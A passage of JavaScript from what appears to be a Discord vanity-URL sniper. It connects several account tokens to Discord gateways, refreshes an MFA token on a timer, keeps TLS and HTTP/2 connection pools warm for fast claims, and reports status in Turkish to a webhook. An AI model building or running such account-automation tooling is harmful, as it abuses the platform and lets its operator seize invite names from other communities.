  setTimeout(() => baglan(token, 'WS-2', 'wss://gateway-us-east1-c.discord.gg/?v=9&encoding=json'), 4000);

  const LT_GWS = ['wss://gateway.discord.gg/?v=9&encoding=json', 'wss://gateway-us-east1-b.discord.gg/?v=9&encoding=json', 'wss://gateway-us-east1-c.discord.gg/?v=9&encoding=json'];
  for (let i = 0; i < listeners.length; i++) {
    const lt = listeners[i]; const gw = LT_GWS[i % LT_GWS.length];
    setTimeout(() => baglan(lt, `LT-${i}`, gw), 7000 + (i * 2000));
  }

  setInterval(() => { mfaAl().catch(_); }, 240000);

  if (webhookURL) {
    setTimeout(() => {
      const vlist = [...vanities.values()].map(v => `\`${v}\``).join(', ') || '-';
      const gn = guildNames.get(curGid) || curGid;
      whGonder(whEmbed("Sniper Açıldı", null, 0x5865F2, [
        whField("Claim Guild", `**${gn}**\n\`${curGid}\``, true),
        whField("Guild", `**${curGidIdx + 1}/${guildIds.length}**`, true),
        whField("Kanallar", `\`${TLS_PORTS.length}T + ${H2_PORTS.length}H\``, true),
        whField("İzlenen Vanity", `**${vanities.size}** vanity${listeners.length > 0 ? ` | ${listeners.length} listener` : ''}`, false),
        whField("Vanity Listesi", vlist.length > 1000 ? vlist.slice(0, 1000) + '...' : vlist, false),
      ]));
    }, 30000);
  }

  setInterval(() => {
    const s = { tls: 0, h2: 0 };
    for (const t of tlsPool) { if (t?.writable && !t.destroyed) s.tls++; }
    for (const h of h2Pool) { if (h && !h.destroyed) s.h2++; }
    const upMin = Math.floor((Date.now() - bootTime) / 60000);
    l('H', `v:${vanities.size} gfm:${guildFireMap.size} mfa:${!!mfaToken} ok:${statsOk}/${statsTotal} up:${upMin}m pool:${s.tls}T+${s.h2}H`);
  }, 60000);
});
